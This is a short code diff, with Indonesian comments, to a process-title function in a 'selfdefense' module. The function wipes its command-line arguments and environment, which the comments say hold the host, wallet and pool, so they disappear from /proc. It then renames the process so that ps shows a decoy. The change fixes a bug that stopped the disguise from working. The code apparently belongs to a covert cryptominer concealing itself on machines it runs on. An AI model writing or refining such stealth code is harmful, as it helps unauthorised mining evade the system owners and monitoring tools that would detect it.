@@ -61,23 +61,32 @@ void init() {
 void set_process_title(int argc, char** argv, const char* title) {
     if (!argv || !argv[0] || !title) return;
 
+    // Salin dulu: title biasanya menunjuk ke string env (getenv), dan area
+    // env ikut di-zero oleh memset di bawah — memakai title setelah memset
+    // berarti prctl menerima string kosong.
+    char buf[64];
+    size_t tlen = strlen(title);
+    if (tlen >= sizeof buf) tlen = sizeof buf - 1;
+    memcpy(buf, title, tlen);
+    buf[tlen] = '\0';
+
     // Luas area kontigu argv+env (Linux: argv dan env berurutan di stack).
     size_t total = 0;
     for (int i = 0; i < argc && argv[i]; i++) total += strlen(argv[i]) + 1;
     for (char** e = environ; *e; e++) total += strlen(*e) + 1;
     if (total == 0) return;
 
-    size_t need = strlen(title) + 1;
+    size_t need = tlen + 1;
     if (need > total) need = total;
 
     // Zero seluruh area: argumen asli (host/wallet/pool) hilang dari
     // /proc/<pid>/cmdline dan /proc/<pid>/environ.
     memset(argv[0], 0, total);
-    memcpy(argv[0], title, need - 1);
+    memcpy(argv[0], buf, need - 1);
     argv[0][need - 1] = '\0';
 
     // /proc/<pid>/comm (kolom CMD di ps) ikut diganti.
-    prctl(PR_SET_NAME, title, 0, 0, 0);
+    prctl(PR_SET_NAME, buf, 0, 0, 0);
 }
 
 }  // namespace xcb::selfdefense
